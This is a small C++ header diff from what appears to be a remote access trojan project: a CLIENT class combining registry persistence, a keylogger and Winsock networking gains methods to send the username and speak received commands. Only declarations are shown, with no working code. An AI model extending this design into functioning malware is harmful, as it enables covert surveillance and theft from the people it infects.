@@ -2,12 +2,13 @@
 #include <WS2tcpip.h>
 #include <string>
 #include "persistence.h"
-#include "core.h"
 #include "keylogger.h"
+#include <sapi.h>
 using namespace std;
 
-class CLIENT : public Registry, public Core, public Keylogger
+class CLIENT : public Registry, public Keylogger
 {
 public:
-	CLIENT();
+	void send_username();
+	void speak_command(string& data);
 };
